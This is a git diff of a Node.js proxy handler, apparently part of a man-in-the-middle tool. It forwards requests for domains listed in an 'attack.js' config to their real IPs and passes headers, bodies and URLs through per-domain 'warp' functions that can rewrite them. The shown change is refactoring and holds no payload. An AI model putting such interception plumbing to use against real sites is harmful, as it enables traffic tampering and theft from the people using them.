@@ -1,17 +1,19 @@
 const originalUrl = require('original-url')
 const { record } = require("../logger.js")
-const { petition_warp, response_warp } = require("../warper.js")
 const request = require('request');
-const dns2 = require('dns2');
-const { UDPClient } = dns2;
+const { UDPClient } = require('dns2');
 const resolve = UDPClient();
 
-const { EXTERNAL_DNS, DOMAINS_UNDER_ATTACK } = require("../config.js");
+const DOMAIN_CONFIG = require("../attack.js").domain_config;
+
+const BYPASS = (...a) => a;
 
 const app = async function (req, res) {
     let { full: url, hostname } = originalUrl(req);
 
-    if (DOMAINS_UNDER_ATTACK.indexOf(hostname) == -1) { res.end("compruebe la url" + DOMAINS_UNDER_ATTACK + " " + hostname); return; }
+    if (DOMAIN_CONFIG[hostname] == -1) {
+        res.end("compruebe la url:" + hostname); return;
+    }
 
     let req_body = "";
 
@@ -26,6 +28,9 @@ const app = async function (req, res) {
             headers: req.headers,
             body: req_body
         });
+
+        let petition_warp = DOMAIN_CONFIG[hostname].petition_warp || BYPASS;
+        let response_warp = DOMAIN_CONFIG[hostname].response_warp || BYPASS;
 
         let [warped_headers, warped_body, warped_url] = petition_warp(req.headers, req_body, url);
 
@@ -79,8 +84,8 @@ async function domain_to_legit_ip(domain, op, cb) {
     const addresses = query.answers.filter(f).map(f);
     if (addresses.length != 0) {
         ip = addresses[0];
-    }else{
-        throw "AaAaAa foward server domain to legit ip";
+    } else {
+        throw "[foward server]: legit ip for domain wasn't found";
     }
     if (cb) {
         cb(false, ip, 4);
